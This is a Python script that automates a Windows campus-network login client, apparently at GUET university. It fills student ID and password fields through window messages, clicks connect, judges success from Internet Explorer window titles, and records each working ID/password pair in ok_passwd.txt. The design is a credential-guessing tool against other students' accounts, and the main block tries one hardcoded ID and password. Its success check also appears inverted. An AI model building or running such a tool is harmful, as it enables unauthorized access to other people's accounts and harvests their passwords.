# -*- coding: utf-8 -*-
"""
Created on Thur June 29 16:00:10 2017

@author: x
"""
import win32gui,win32api,win32con

def find_idxSubHandle(pHandle, winClass, index=0):  
    """ 
    已知子窗口的窗体类名 
    寻找第index号个同类型的兄弟窗口 
    pHandle父类句柄
    winclass同类型句柄，index是同类型该句柄的索引
    """  
    assert type(index) == int and index >= 0 
    handle = win32gui.FindWindowEx(pHandle, 0, winClass, None)  
    while index > 0:  
        handle = win32gui.FindWindowEx(pHandle, handle, winClass, None)  
        index -= 1  
    return handle

def find_subHandle(pHandle, winClassList):  
    """ 
    递归寻找子窗口的句柄 
    pHandle是祖父窗口的句柄 
    winClassList是各个子窗口的class列表，父辈的list-index小于子辈 
    """  
    assert type(winClassList) == list  
    if len(winClassList) == 1:  
        return find_idxSubHandle(pHandle, winClassList[0][0], winClassList[0][1])  
    else:  
        pHandle = find_idxSubHandle(pHandle, winClassList[0][0], winClassList[0][1])  
        return find_subHandle(pHandle, winClassList[1:])  

def guet_connect(pHandle,idHandle,id,pwHandle,pw,Button_Handle):
    """
    pHandle为父窗体句柄
    idHandle为客户端用户名句柄
    pwHandle为客户端密码句柄
    Button_Handle为客户端连接按钮句柄
    """
    ok_id=win32gui.SendMessage(idHandle, win32con.WM_SETTEXT, None, id)
    ok_pw=win32gui.SendMessage(pwHandle, win32con.WM_SETTEXT, None, pw)
    ok_button=win32api.SendMessage(pHandle, win32con.WM_COMMAND, 1, Button_Handle)
#     处理之后返回0
    if ok_id==0 and ok_pw==0 and ok_button==0:
        print("一次登陆尝试")

def check_connect(pHandle,Button_Handle):
    """
    pHandle为父窗体句柄
    Button_Handle为客户端查询按钮句柄
    """
    chaxun_button=win32api.SendMessage(pHandle, win32con.WM_COMMAND, 1, Button_Handle)
    if chaxun_button==0:
        ie_error_Handle=win32gui.FindWindow(None,'http://172.16.1.1/ipmanager/login.jsp?id=0 - Internet Explorer')#登陆失败会获取该句柄
        ie_ok_Handle=win32gui.FindWindow(None,'网络管理系统 - Internet Explorer')#登陆成功会获取该句柄
        if ie_ok_Handle==0:
            # 登陆成功
            print("success")
            close_ie=win32gui.PostMessage(ie_ok_Handle, win32con.WM_CLOSE, 0, 0)
            return 1
        elif ie_error_Handle==0:
            #登陆失败
            print("error")
            close_ie=win32gui.PostMessage(ie_error_Handle, win32con.WM_CLOSE, 0, 0)
            return 0   

def write_file(student_id,student_pw):
    success_passwd=open('ok_passwd.txt','a')
    success_passwd.write('学号:%s\t密码:%s\n'%(student_id,student_pw))
    print("成功记录一条数据："+'学号:%s\t密码:%s\n'%(student_id,student_pw))
    
    success_passwd.close

def get_message(hwnd):
    buf_size = win32gui.SendMessage(hwnd, win32con.WM_GETTEXTLENGTH) + 1  # 要加上截尾的字节  
    str_buffer = win32gui.PyMakeBuffer(buf_size)  # 生成buffer对象  
    win32api.SendMessage(hwnd, win32con.WM_GETTEXT, buf_size, str_buffer)  # 获取buffer  
#     str_buffer = str(str_buffer[:-1])  # 转为字符串
    address, length = win32gui.PyGetBufferAddressAndLen(str_buffer)
    text = win32gui.PyGetString(address, length) 
    return text


class ipGUET(object):  
    def __init__(self, fgFilePath=None):  
        self.Mhandle = win32gui.FindWindow(None,'IP出校控制器')  
#         print ("IP 出校器初始化完成,父类句柄为%x"%(self.Mhandle) )
#         TButton0_handle = find_subHandle(self.Mhandle, [("TButton",0)])
#         TButton1_handle = find_subHandle(self.Mhandle,[("TComboBox",0),("Edit",0)])
        self.TEdit_id_handle = find_subHandle(self.Mhandle, [("TEdit",1)])#用户名
        self.TEdit_pw_handle = find_subHandle(self.Mhandle, [("TEdit",0)])#密码
        self.TStatusBar_handle = find_subHandle(self.Mhandle, [("TStatusBar",0)])#版本信息
        self.TButton_lianjie_handle=win32gui.FindWindowEx(self.Mhandle,0,None,"连接")
        self.TButton_chaxun_handle=win32gui.FindWindowEx(self.Mhandle,0,None,"查询")
        self.GroupBox_handle= find_subHandle(self.Mhandle, [("TGroupBox",0)])#余额
#         print ("用户名句柄:%x\t密码句柄:%x\n连接按钮句柄:%x\t查询按钮句柄:%x \n版本信息句柄:%x\n余额句柄:%x" % (self.TEdit_id_handle,self.TEdit_pw_handle,self.TStatusBar_handle,self.TButton_lianjie_handle,self.TButton_chaxun_handle,self.GroupBox_handle))
        
    def start(self,student_id,student_pw):
        guet_connect(self.Mhandle,self.TEdit_id_handle,student_id,self.TEdit_pw_handle,student_pw,self.TButton_lianjie_handle)
        #print(get_message(TEdit_id_handle))
        check_result=check_connect(self.Mhandle,self.TButton_chaxun_handle)
        if check_result==1:
            write_file(student_id,student_pw)
        

if __name__=="__main__":
#     win32api.MessageBox(win32con.NULL, 'Python 你好！', '你好', win32con.MB_OK)  
    my_ipguet=ipGUET()
    my_ipguet.start('1316020249','184396')
